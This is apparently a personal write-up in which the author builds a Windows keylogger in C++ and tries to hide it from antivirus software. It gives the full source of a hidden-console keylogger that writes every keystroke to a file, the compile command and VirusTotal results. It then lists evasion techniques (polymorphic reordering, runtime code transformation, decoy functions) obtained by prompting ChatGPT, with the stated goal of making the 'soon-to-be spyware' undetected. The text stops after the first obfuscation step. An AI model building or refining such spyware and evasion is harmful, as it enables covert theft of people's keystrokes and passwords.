Malware Experimentation
---

In this experiment, i will try to develop a malware that is able to bypass antivirus softwares for educational purpose. For the sake of demonstration, i will primarily use C++ to create a malware.

Jan 21 2025
---

I have created a keylogger file using one on the internet in which it will save the output in log.txt every time i type.

```
#include <iostream>
#include <windows.h>

using namespace std;

int Save(int _key, char *file);

int main(){
    FreeConsole();

    char i;
    while(true) {
    Sleep(10);
    for(i=8; i<=255; i++) {
        if(GetAsyncKeyState(i)== -32767){
            Save(i, "log.txt");
        }
    }

} 
return 0;
}

int Save(int _key, char *file) {
    cout<< _key << endl;
    Sleep(10);
    FILE *OUTPUT_FILE; // can also use the ofstream command
    OUTPUT_FILE = fopen(file, "a+"); //a+ is used to add new keys each time, and not overwrite
    switch(_key)
    {
        case VK_SHIFT: fprintf(OUTPUT_FILE, "[SHIFT]");
            break;
        case VK_BACK: fprintf(OUTPUT_FILE, "[BACKSPACE]");
            break;
        case VK_LBUTTON: fprintf(OUTPUT_FILE, "[LBUTTON]");
            break;
        case VK_RBUTTON: fprintf(OUTPUT_FILE, "[RBUTTON]");
            break;
        case VK_RETURN: fprintf(OUTPUT_FILE, "[ENTER]");
            break;
        case VK_TAB: fprintf(OUTPUT_FILE, "[TAB]");
            break;
        case VK_ESCAPE: fprintf(OUTPUT_FILE, "[ESCAPE]");
            break;
        case VK_CONTROL: fprintf(OUTPUT_FILE, "[Ctrl]");
            break;
        case VK_MENU: fprintf(OUTPUT_FILE, "[Alt]");
            break;
        case VK_CAPITAL: fprintf(OUTPUT_FILE, "[CAPS Lock]");
            break;
        case VK_SPACE: fprintf(OUTPUT_FILE, "[SPACE]");
            break;
    }
    fprintf(OUTPUT_FILE, "%s", &_key);
    fclose(OUTPUT_FILE);
    return 0;
}
```
Next, i compiled it with g++

```
g++ -o test test.cpp
```
**File: log.txt**

![image](https://github.com/user-attachments/assets/ef8020dd-bf85-4d72-98ef-9adac3c205fa)

As you can see from the output file, it records everything when this file is running. Now let's see how it is evaluated in VirusTotal.

Static Analysis
---

![image](https://github.com/user-attachments/assets/3eec70fa-01ad-49a6-8db8-17eb5c6846be)

Dynamic Static Analysis
--

![image](https://github.com/user-attachments/assets/bb10c840-78cf-4076-a3a7-bd7dae1d0582)


**Results:** It seems that some antivirus flag this file as a spyware which is correct but at this momemt it isn't a spyware yet! (and some give us false positive result lol)

> [!Tip]
> If we want our soon-to-be spyware undetected, we need to wear a ghillie suit!

With that being said, we will now obfuscate the code to make things harder for VirusTotal!

What we are going to do is obfuscation. This proccess makes AVs especially static analysis having a hard time due to it couldn't inspect the code because the code does not make any sense! AVs usually detects behavioral patterns, dangerous commands some also implemented AI for this very purpose. Tha'ts where obfuscation came in. 

> [!Tip]
> Obfuscation can be de-obfuscation or reverse engineering if they wanted to!

Here is my idea when i want to obfuscate my spyware. I ask ChatGPT with this idea:

> [!NOTE]
> i want somethnig that make the code readable but when AV inspect it. It gets another definition. No patterns are made. make it random as possible. what technique do you think is closest to this one?ontent.

Obfuscation Techniques:
--
1. Polymorphic Code (Randomization) => Randomize and reorder functions so that static analysis couldn't found matched functions.
2. Runtime Code Transformation => Malicious logic code executes only when it is being called. When it is not being called, it will be hidden.
3. Decoy Code (Misdirection) => Make a decoy function that seems like a legitimate function.

This should make AVs focus on the decoy code(Decoy Code (Misdirection)) while concealing most of the code logic in which it prevents AVs from trying to understand the code(Polymorphic Code (Randomization)). Lastly, the malicious code logic is executed when being called. (Runtime Code Transformation)

Polymorphic Code (Randomization)
--

In the example of sourcecode, we will drag main() below to make it illogical for Static Analysis. 

```
int main(){
    FreeConsole();

    char i;
    while(true) {
    Sleep(10);
    for(i=8; i<=255; i++) {
        if(GetAsyncKeyState(i)== -32767){
            Save(i, "log.txt");
        }
    }

} 
return 0;
}
```


References
---

**1.What is Polymorphic Function:** https://www.geeksforgeeks.org/polymorphic-function-in-compiler-design-1/
